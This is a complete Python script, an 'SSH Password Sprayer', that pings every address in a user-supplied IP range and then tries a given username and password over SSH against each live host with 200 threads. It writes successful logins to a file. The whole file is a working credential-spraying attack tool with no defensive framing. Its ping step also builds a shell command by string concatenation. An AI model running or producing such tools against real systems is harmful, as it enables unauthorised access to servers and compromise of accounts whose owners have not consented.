import socket
import paramiko
import ipaddress
from ipaddress import IPv4Address, IPv4Network
import threading
from queue import Queue
import subprocess


count = 0
iplist = []
pinglist = []
print("-"*40)
print("Welcome to My SSH Password Sprayer")
print("-"*40)
username = input("Enter username: ").strip()
password = input("Enter password: ").strip()
iprange = input("Enter range to spray against: ").strip()
numthreads = input("Enter the number of threads (For Mac, use a max of 250 unless you up the ulimit...on kali and most linux distros use a max of 1000 unless you up the ulimit): ").strip()
usr = username.strip()
pswd = password.strip()
scanrange = IPv4Network(iprange)
string = "You are running a password spray with username '{}' and password '{}' against netblock {}."
output = string.format(username,password,iprange)
print(output)
print("-"*40)
print("Spraying...")
iprange2 = str(scanrange)
outfile = open("outfile.txt","w")

################
def Pinger(ip):
    try:
        ip2 = str(ip)
        isup, result = subprocess.getstatusoutput("ping -c1 " + str(ip))
        if isup == 0:
            print("Host %s UP" % str(ip))
            pinglist.append(str(ip))
    except:
        pass
    
################
def Connector(ip):
    try:
        ip2 = str(ip)
        ssh = paramiko.SSHClient()
        ssh.load_system_host_keys()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip2, port=22, username=usr, password=pswd, timeout=1.0)
        print("\033[92mlogin successful - %s:%s@%s\033[0m" % (username, password, ip))
        ssh.close()
        outfile.write("login successful - %s:%s@%s\n" % (username, password, ip))
    except paramiko.AuthenticationException:
        print("\033[91mAuthentication failed: %s\033[0m" % (ip))
        ssh.close()
        pass
    except:
        pass
#################
def threader():
    while True:
        worker = q.get()
        Pinger(worker)
        q.task_done()
#################
def threader2():
    while True:
        worker2 = q2.get()
        Connector(worker2)
        q2.task_done()
        
q = Queue()

for ip in ipaddress.IPv4Network(iprange2):
    count = count + 1
    iplist.append(str(ip))

for x in range(int(numthreads)):
    t = threading.Thread(target=threader)
    t.daemon = True
    t.start()


for worker in iplist:
    q.put(worker)

q.join()

q2 = Queue()

for y in range(200):
    t2 = threading.Thread(target=threader2)
    t2.daemon = True
    t2.start()

for worker2 in pinglist:
    q2.put(worker2)

q2.join()
    
outfile.close()
print("-"*40)
print("Spray done!")
print("Data written to outfile.txt in the current directory")
print("-"*40)
